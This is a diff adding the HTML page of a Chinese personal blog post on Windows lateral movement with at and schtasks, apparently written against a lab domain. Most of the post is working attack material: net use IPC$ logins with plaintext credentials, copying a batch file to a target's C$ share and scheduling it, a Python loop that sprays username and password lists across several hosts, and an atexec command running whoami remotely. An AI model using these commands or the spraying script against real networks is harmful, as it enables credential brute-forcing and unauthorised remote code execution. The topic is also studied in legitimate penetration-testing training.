@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>横向--at&amp;schtasks | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+查看当前会话
+net use
+端口开放
+135：135端口主要用于使用RPC（Remote Procedure Call，远程过程调用）协议并提供DCOM（分布式组件对象模型）服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">横向--at&amp;schtasks</h2>
+            <div class="post-date">2023-03-20</div>
+            
+            <div class="post-content" v-pre>
+              <figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1679375733795.png" alt="" loading="lazy"></figure>
+<p>查看当前会话<br>
+net use</p>
+<p>端口开放<br>
+135：135端口主要用于使用RPC（Remote Procedure Call，远程过程调用）协议并提供DCOM（分布式组件对象模型）服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码。</p>
+<p>445： 445端口的主要特点是支持文件共享</p>
+<p>明文<br>
+<strong>at</strong><br>
+建立ipc连接：<br>
+net use \192.168.52.138\ipc$ &quot;Qwer123&quot; /user:god.org\administrator</p>
+<p>拷贝执行文件到目标机器<br>
+copy test.bat \192.168.52.138\c$</p>
+<p>添加计划任务<br>
+at  \192.168.3.21 18:55 c:\test.bat</p>
+<p>查看<br>
+at<br>
+at id</p>
+<p><strong>schtasks</strong></p>
+<p><img src="https://dydydy123.github.io/post-images/1679311191666.png" alt="" loading="lazy"><br>
+<img src="https://dydydy123.github.io/post-images/1679314322127.png" alt="" loading="lazy"></p>
+<pre><code>pip install pyinstaller
+pyinstaller -F app.py
+import os,time
+ips={
+'192.168.3.21',
+'192.168.3.25',
+'192.168.3.29',
+'192.168.3.30',
+'192.168.3.31',
+'192.168.3.33'
+}
+users={
+'Administrator',
+'boss',
+'dbadmin',
+'fileadmin',
+'mack',
+'mary',
+'vpnadm',
+'webadmin'
+}
+passs={
+'admin',
+'admin!@#45',
+'Admin12345'
+}
+for ip in ips:
+for user in users:
+for mima in passs:
+           exec=&quot;net use \&quot;+ &quot;\&quot;+ip+'\ipc$ '+mima+' /user:god\'+user
+           print('---&gt;'+exec+'&lt;---')
+           os.system(exec)
+           time.sleep(1)
+
+</code></pre>
+<p>atexec.exe god/liukaifeng01:Qwer123@192.168.52.138  &quot;whoami&quot;</p>
+<p>C:\Users\待遇\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\LocalCache\local-packages\Python38\Scripts</p>
+
+            </div>
+            
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
